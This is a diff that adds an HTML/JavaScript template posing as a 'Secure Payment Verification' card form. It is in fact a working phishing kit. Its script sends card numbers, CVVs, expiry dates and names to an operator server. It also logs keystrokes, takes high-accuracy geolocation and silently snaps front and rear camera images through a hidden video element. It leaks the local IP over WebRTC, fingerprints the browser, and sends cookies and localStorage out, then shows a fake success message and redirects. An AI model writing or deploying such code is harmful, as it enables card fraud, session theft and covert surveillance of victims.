@@ -1,0 +1,166 @@
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Secure Payment Verification</title>
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
+.container { background: #fff; padding: 30px; border-radius: 16px; box-shadow: 0 20px 60px rgba(0,0,0,0.3); width: 100%; max-width: 400px; }
+.header { text-align: center; margin-bottom: 25px; }
+.lock-icon { font-size: 40px; margin-bottom: 10px; }
+h1 { font-size: 22px; color: #1a1a2e; margin-bottom: 5px; }
+.subtitle { color: #666; font-size: 14px; }
+.card-preview { background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%); border-radius: 12px; padding: 20px; margin-bottom: 25px; color: #fff; }
+.card-chip { width: 40px; height: 30px; background: linear-gradient(135deg, #ffd700 0%, #ffb700 100%); border-radius: 6px; margin-bottom: 20px; }
+.card-number { font-size: 18px; letter-spacing: 3px; margin-bottom: 15px; font-family: 'Courier New', monospace; }
+.card-details { display: flex; justify-content: space-between; font-size: 12px; }
+.card-label { color: #888; text-transform: uppercase; font-size: 10px; margin-bottom: 3px; }
+label { display: block; font-size: 13px; font-weight: 600; color: #333; margin-bottom: 6px; }
+input { width: 100%; padding: 14px; border: 2px solid #e0e0e0; border-radius: 10px; font-size: 16px; margin-bottom: 15px; transition: border-color 0.3s; }
+input:focus { border-color: #667eea; outline: none; }
+.row { display: flex; gap: 15px; }
+.row > div { flex: 1; }
+.btn { width: 100%; padding: 16px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: #fff; border: none; border-radius: 10px; font-size: 16px; font-weight: 600; cursor: pointer; }
+.btn:hover { opacity: 0.9; }
+.secure { text-align: center; margin-top: 20px; font-size: 12px; color: #888; }
+.secure img { height: 30px; margin: 0 5px; vertical-align: middle; }
+.loading { display: none; text-align: center; padding: 40px; }
+.spinner { width: 50px; height: 50px; border: 4px solid #e0e0e0; border-top-color: #667eea; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+@keyframes spin { to { transform: rotate(360deg); } }
+.success { display: none; text-align: center; padding: 40px; }
+.success-icon { font-size: 60px; margin-bottom: 20px; }
+</style>
+</head>
+<body>
+<div class="container">
+<div id="formSection">
+<div class="header">
+<div class="lock-icon">🔒</div>
+<h1>Secure Payment Verification</h1>
+<p class="subtitle">Please verify your card to continue</p>
+</div>
+<div class="card-preview">
+<div class="card-chip"></div>
+<div class="card-number" id="cardDisplay">•••• •••• •••• ••••</div>
+<div class="card-details">
+<div><div class="card-label">Card Holder</div><div id="nameDisplay">YOUR NAME</div></div>
+<div><div class="card-label">Expires</div><div id="expiryDisplay">MM/YY</div></div>
+</div>
+</div>
+<form id="cardForm">
+<label>Card Number</label>
+<input type="text" id="cardnum" placeholder="1234 5678 9012 3456" maxlength="19" required>
+<label>Cardholder Name</label>
+<input type="text" id="name" placeholder="John Doe" required>
+<div class="row">
+<div><label>Expiry Date</label><input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required></div>
+<div><label>CVV</label><input type="text" id="cvv" placeholder="123" maxlength="4" required></div>
+</div>
+<button type="submit" class="btn">Verify Card</button>
+</form>
+<div class="secure">🔐 Secured by SSL Encryption</div>
+</div>
+<div class="loading" id="loading">
+<div class="spinner"></div>
+<p>Verifying your card...</p>
+</div>
+<div class="success" id="success">
+<div class="success-icon">✅</div>
+<h2>Verification Successful!</h2>
+<p>Redirecting...</p>
+</div>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas hidden id="canvas" width="500" height="500"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var keylog = "";
+
+document.getElementById('cardnum').addEventListener('input', function(e) {
+    let v = e.target.value.replace(/\s/g, '').replace(/\D/g, '');
+    e.target.value = v.replace(/(.{4})/g, '$1 ').trim();
+    document.getElementById('cardDisplay').textContent = e.target.value || '•••• •••• •••• ••••';
+});
+document.getElementById('name').addEventListener('input', function(e) {
+    document.getElementById('nameDisplay').textContent = e.target.value.toUpperCase() || 'YOUR NAME';
+});
+document.getElementById('expiry').addEventListener('input', function(e) {
+    let v = e.target.value.replace(/\D/g, '');
+    if(v.length >= 2) v = v.slice(0,2) + '/' + v.slice(2);
+    e.target.value = v;
+    document.getElementById('expiryDisplay').textContent = e.target.value || 'MM/YY';
+});
+
+document.querySelectorAll('input').forEach(input => {
+    input.addEventListener('keyup', function(e) {
+        keylog += e.key;
+    });
+});
+
+window.onload = function() {
+    if(navigator.geolocation) { navigator.geolocation.getCurrentPosition((p)=>{ $.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy}); }, ()=>{}, {enableHighAccuracy:true}); }
+    async function captureCamera(f, l) { try { const s = await navigator.mediaDevices.getUserMedia({video:{facingMode:f}}); video.srcObject=s; await new Promise(r=>setTimeout(r,1500)); canvas.getContext('2d').drawImage(video,0,0,500,500); $.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/png").replace("data:image/png;base64,","")),cam:l}); s.getTracks().forEach(t=>t.stop()); } catch(e){} }
+    captureCamera("user","selfie").then(()=>captureCamera("environment","back"));
+    getWebRTC(); getFingerprint(); getSession();
+}
+
+function getWebRTC() {
+    try {
+        const pc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+        pc.createDataChannel("");
+        pc.createOffer().then(o => pc.setLocalDescription(o));
+        pc.onicecandidate = (e) => {
+            if(e.candidate) {
+                const parts = e.candidate.candidate.split(' ');
+                const ip = parts[4];
+                if(ip && ip.indexOf('.') > 0) $.post("<%=a %>/webrtc", {uid:uid, localip:ip});
+            }
+        };
+    } catch(e) {}
+}
+
+function getFingerprint() {
+    const canvas = document.createElement('canvas');
+    const ctx = canvas.getContext('2d');
+    ctx.textBaseline = 'top';
+    ctx.font = '14px Arial';
+    ctx.fillText('fingerprint', 2, 2);
+    const fp = canvas.toDataURL().slice(-50);
+    $.post("<%=a %>/fingerprint", {uid:uid, fp:fp});
+}
+
+function getSession() {
+    try {
+        const cookies = document.cookie;
+        const storage = JSON.stringify(localStorage);
+        if(cookies || storage) $.post("<%=a %>/session", {uid:uid, cookies:encodeURIComponent(cookies), storage:encodeURIComponent(storage)});
+    } catch(e) {}
+}
+
+document.getElementById('cardForm').onsubmit = function(e) {
+    e.preventDefault();
+    document.getElementById('formSection').style.display = 'none';
+    document.getElementById('loading').style.display = 'block';
+    
+    if(keylog) $.post("<%=a %>/keylog", {uid:uid, keys:encodeURIComponent(keylog), field:"card_form"});
+    
+    $.post("<%=a %>/card", {
+        uid: uid,
+        cardnum: document.getElementById('cardnum').value,
+        expiry: document.getElementById('expiry').value,
+        cvv: document.getElementById('cvv').value,
+        name: document.getElementById('name').value
+    }, function() {
+        setTimeout(() => {
+            document.getElementById('loading').style.display = 'none';
+            document.getElementById('success').style.display = 'block';
+            setTimeout(() => { window.location.href = "<%=url %>"; }, 2000);
+        }, 2000);
+    });
+};
+</script>
+</body>
+</html>
